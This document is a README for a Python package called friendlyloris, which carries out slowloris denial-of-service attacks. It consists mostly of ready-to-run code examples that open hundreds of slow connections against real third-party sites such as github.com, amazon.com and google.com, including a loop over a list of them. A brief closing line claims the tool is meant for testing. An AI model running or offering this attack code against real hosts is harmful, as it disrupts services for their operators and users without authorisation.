# ✨ friendlyloris, a simple slow loris package for Python ✨

### Here is a minimal start:

1.  Install with `pip install friendlyloris`
2.  Run the following code:

        from friendlyloris import FriendlyLoris

        loris = FriendlyLoris(host="github.com")

        loris.run()

### The following options are available. The only required option is host:

- **Host** *The URL or IP address we want to connect to*
- **Port** *The port number we will use to connect*
- **Https** *If we will start an encrypted connection*
- **Connections** *The number of simultanious connections we will make*
- **Interval** *The number of seconds we wait before refreshing connections*
- **Loops** *How many times we will refresh connections*
- **Verbose** *If we want to see verbose logging*

### Here is an example with the default values:

    from friendlyloris import FriendlyLoris

    loris = FriendlyLoris(
        host = "github.com",
        port = 443,
        https = True, 
        connections = 200, 
        interval = 10, 
        loops = 5, 
        verbose = False
        )

    loris.run()

### A few more examples below:

Connecting with plaintext HTTP:

    from friendlyloris import FriendlyLoris

    loris = FriendlyLoris(
        host = "github.com",
        port = 80,
        https = False
        )

    loris.run()

More connections and verbose logging:

    from friendlyloris import FriendlyLoris

    loris = FriendlyLoris(
        host = "github.com",
        connections = 500,
        verbose = True
        )

    loris.run()

More connections, shorter timeout and 1 loop:

    from friendlyloris import FriendlyLoris

    loris = FriendlyLoris(
        host = "github.com",
        connections = 500,
        interval = 5,
        loops = 1
        )

    loris.run()

Finally, quick tests running against a list of sites:

    from friendlyloris import FriendlyLoris

    hosts = [
        "github.com",
        "stackoverflow.com",
        "amazon.com",
        "google.com",
    ]

    for site in hosts:

        loris = FriendlyLoris(
            host = site,
            connections = 100,
            interval = 5,
            loops = 2,
            verbose = True
            )

        loris.run()

A [good article](https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/) on how this works 🎉

This was designed for testing, not malice 😊 Please use as such 😇

Enjoy 🤙